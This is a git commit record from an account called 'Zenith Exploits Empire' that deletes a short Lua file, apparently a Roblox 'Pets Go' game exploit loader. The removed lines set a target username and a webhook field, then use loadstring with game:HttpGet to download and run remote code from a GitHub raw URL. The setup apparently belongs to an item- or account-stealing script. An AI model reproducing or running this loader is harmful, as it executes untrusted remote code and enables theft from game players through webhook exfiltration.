2d1e398ea0c7bd49c71cca352aec911269b27623
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-19 09:49:34 +0200

    Delete pets go/MyBot.lua

--- pets go/MyBot.lua
+++
@@ -1,5 +0,0 @@
-Username = "s25088@sgc.ac.zw"
-Username2 = "hrt"
-Webhook = "gsf"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/main/pets%20go/MyBot.lua"))()
